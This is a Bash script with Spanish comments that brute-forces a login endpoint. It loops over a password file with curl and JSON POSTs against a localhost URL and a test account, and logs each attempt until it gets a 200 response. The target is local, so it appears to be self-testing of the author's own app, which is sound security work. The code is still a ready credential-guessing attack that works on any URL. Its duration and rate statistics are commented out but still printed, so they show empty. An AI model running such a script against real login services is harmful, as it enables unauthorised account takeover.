#!/bin/bash
set -x


TARGET_URL="http://127.0.0.1:8000/login"
TARGET_USERNAME="tester_brute"
PASSWORD_FILE="passwords.txt"
LOG_FILE="brute_force_results.log"


echo "--- Inicio de Prueba de Fuerza Bruta Controlada ---" > "$LOG_FILE"
echo "URL: $TARGET_URL" | tee -a "$LOG_FILE"
echo "Usuario objetivo: $TARGET_USERNAME" | tee -a "$LOG_FILE"
echo "Cargando contraseñas desde: $PASSWORD_FILE" | tee -a "$LOG_FILE"
echo "----------------------------------------------------" | tee -a "$LOG_FILE"
START_TIME=$(date +%s.%N)
ATTEMPTS=0
SUCCESS=false

# --- Lectura y Ataque ---

START_TIME=$(date +%s.%N)
ATTEMPTS=0
SUCCESS=false
ATTEMPTS_TOTAL=0 # Usaremos una nueva variable para evitar conflictos

# Ejecutamos el ataque línea por línea usando xargs. 
# -I {} toma cada línea y la pasa como argumento a PASSWORD_TRIMMED
cat "$PASSWORD_FILE" | tr -d '\r' | xargs -I {} bash -c "

    password='{}'
    
    # SALTAMOS LÍNEAS VACÍAS
    if [ -z \"\$password\" ]; then
        exit 0
    fi

    # Incrementar el contador (usamos un archivo temporal para el contador)
    echo '1' >> attempts.tmp
    ATTEMPTS=\$(wc -l < attempts.tmp | tr -d ' ')

    PASSWORD_TRIMMED=\"\$password\"

    # 1. Preparar los datos JSON para el request
    JSON_DATA=\"{\\\"username\\\": \\\"$TARGET_USERNAME\\\", \\\"password\\\": \\\"\$PASSWORD_TRIMMED\\\"}\"
    
    # 2. Ejecutar el ataque usando curl
    HTTP_STATUS=\$(curl -s -o /dev/null -w \"%\{http_code\}\" -X POST \
        -H \"Content-Type: application/json\" \
        -d \"\$JSON_DATA\" \
        \"$TARGET_URL\")

    # 3. Analizar la respuesta
    if [ \"\$HTTP_STATUS\" == \"200\" ]; then
        echo \"✅ ÉXITO! Credencial encontrada en el intento \$ATTEMPTS: $TARGET_USERNAME:\$PASSWORD_TRIMMED\" | tee -a \"$LOG_FILE\"
        # Usamos un archivo de éxito para detener xargs
        echo 'true' > success.tmp
        exit 1 # Forzar la salida de xargs
    else
        echo \"❌ Fallido. Intento \$ATTEMPTS con '\$PASSWORD_TRIMMED' - Estado \$HTTP_STATUS\" >> \"$LOG_FILE\"
    fi

"
# El éxito se verifica con el archivo de éxito
if [ -f "success.tmp" ]; then
    SUCCESS=true
fi

# El contador de intentos totales se lee del archivo temporal
ATTEMPTS=$(wc -l < attempts.tmp | tr -d ' ')

# Limpiar archivos temporales
rm -f attempts.tmp success.tmp

# --- CONTINUAR CON EL RESUMEN Y ESTADÍSTICAS ---

# --- CONTINUAR CON EL RESUMEN Y ESTADÍSTICAS (COMENTANDO 'bc') ---
# ...

# --- CONTINUAR CON EL RESUMEN Y ESTADÍSTICAS ---

END_TIME=$(date +%s.%N)
# DURATION Y RATE YA ESTÁN COMENTADOS

echo "----------------------------------------------------" | tee -a "$LOG_FILE"
# ... (el resto de las líneas de resumen)

# --- Estadísticas y Resultados ---

END_TIME=$(date +%s.%N)
#DURATION=$(echo "$END_TIME - $START_TIME" | bc)
#RATE=$(echo "scale=2; $ATTEMPTS / $DURATION" | bc)

echo "----------------------------------------------------" | tee -a "$LOG_FILE"
echo "Resumen del Ataque" | tee -a "$LOG_FILE"
echo "Intentos totales: $ATTEMPTS" | tee -a "$LOG_FILE"
echo "Tiempo total: ${DURATION} segundos" | tee -a "$LOG_FILE"
echo "Tasa de ataque: ${RATE} intentos/segundo" | tee -a "$LOG_FILE"

if $SUCCESS; then
    echo "Resultado: Ataque de fuerza bruta **EXITOSO**." | tee -a "$LOG_FILE"
else
    echo "Resultado: Ataque de fuerza bruta fallido (contraseña no encontrada)." | tee -a "$LOG_FILE"
fi

echo "Resultados completos guardados en $LOG_FILE"